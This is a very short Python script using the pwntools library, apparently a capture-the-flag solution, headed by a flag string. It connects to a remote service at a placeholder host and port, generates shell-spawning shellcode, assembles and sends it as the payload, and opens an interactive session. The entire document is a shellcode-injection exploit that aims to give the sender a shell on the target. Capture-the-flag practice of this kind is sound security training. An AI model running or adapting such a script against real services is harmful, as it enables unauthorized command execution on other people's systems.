#RTG{Fr0m_PwN_2_Sh3llZ}
from pwn import *

p = remote('server', 0000)

# use the generated shellcode
shellcode = shellcraft.sh()
print("Shellcode:")
print(shellcode)

payload = asm(shellcode)
p.sendline(payload)
p.interactive()